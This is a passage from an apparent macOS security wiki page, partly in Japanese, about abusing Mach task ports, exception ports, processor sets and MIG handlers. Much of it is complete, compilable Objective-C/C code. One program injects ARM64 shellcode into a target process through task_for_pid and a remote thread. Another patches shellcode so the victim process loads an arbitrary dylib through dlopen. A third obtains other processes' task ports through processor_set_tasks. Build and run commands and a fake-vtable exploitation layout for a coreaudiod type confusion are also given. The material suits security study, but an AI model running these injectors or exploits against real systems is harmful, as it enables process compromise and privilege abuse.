// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> iOSでこれを機能させるには、書き込み可能なメモリを実行可能にするために `dynamic-codesigning` entitlement が必要です。

### Task port経由のthreadへのDylib Injection

macOSでは、**threads**は**Mach**経由、またはPOSIXの `pthread` apiを使用して操作できます。前のInjectionで生成したthreadはMach apiを使用して生成されたため、**POSIX compliantではありません**。

**POSIX** compliant apiと連携する必要がなく、Machのみで動作したため、**simple shellcodeをinject**してcommandを実行できました。より**複雑なInjection**では、**thread**も**POSIX compliant**である必要があります。

そのため、**threadを改善する**には、**有効なpthreadを作成する** `pthread_create_from_mach_thread` を呼び出す必要があります。すると、この新しいpthreadから **dlopenを呼び出して**systemから**dylibをload**できます。つまり、さまざまなactionを実行するために新しいshellcodeを書く代わりに、custom librariesをloadできるようになります。<sup>[[2]](#references)</sup>

**example dylibs**は、以下にあります（例えば、logを生成し、その後それをlistenできるものです）。


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

この technique ではプロセスの thread が hijack されます:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

`task_for_pid` または `thread_create_*` を呼び出すと、kernel 内の task 構造体にある counter がインクリメントされます。この値には、user mode から `task_info(task, TASK_EXTMOD_INFO, ...)` を呼び出すことでアクセスできます。

## Exception Ports

thread で exception が発生すると、この exception は thread に指定された exception port に送信されます。thread が処理しない場合は、task の exception ports に送信されます。task が処理しない場合は、launchd によって管理されている host port に送信され、そこで acknowledge されます。これを exception triage と呼びます。

通常、適切に処理されなかった場合、最終的に report は ReportCrash daemon によって処理されることに注意してください。ただし、同じ task 内の別の thread が exception を処理することも可能です。`PLCreashReporter` のような crash reporting tools はこの仕組みを使用します。

## Other Objects

### Clock

すべての user は clock の情報にアクセスできますが、時刻の設定やその他の設定の変更には root が必要です。

情報を取得するには、`clock_get_time`、`clock_get_attributtes`、`clock_alarm` などの `clock` subsystem の functions を呼び出します。\
値を変更するには、`clock_set_time` や `clock_set_attributes` などの functions を持つ `clock_priv` subsystem を使用できます。

### Processors and Processor Set

processor APIs を使用すると、`processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` などの functions を呼び出して、単一の logical processor を制御できます。

さらに、**processor set** APIs は、複数の processors を1つの group にまとめる方法を提供します。**`processor_set_default`** を呼び出すことで、default processor set を取得できます。\
processor set とやり取りするための興味深い APIs は次のとおりです:

- `processor_set_statistics`
- `processor_set_tasks`: processor set 内のすべての tasks への send rights の array を返す
- `processor_set_threads`: processor set 内のすべての threads への send rights の array を返す
- `processor_set_stack_usage`
- `processor_set_info`

[**この post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) で説明されているように、過去にはこれを利用して、前述の protection を bypass し、**`processor_set_tasks`** を呼び出してすべての processes 上の host port を取得することで、他の processes の task ports を取得して control することが可能でした。\
現在、この function の使用には root が必要であり、これは protected されているため、これらの ports を取得できるのは unprotected processes のみです。<sup>[[11]](#references)</sup>

次のコードで試すことができます:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[10]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; vtable slot経由の間接call
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)
- [7] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [8] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [9] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [10] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [11] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
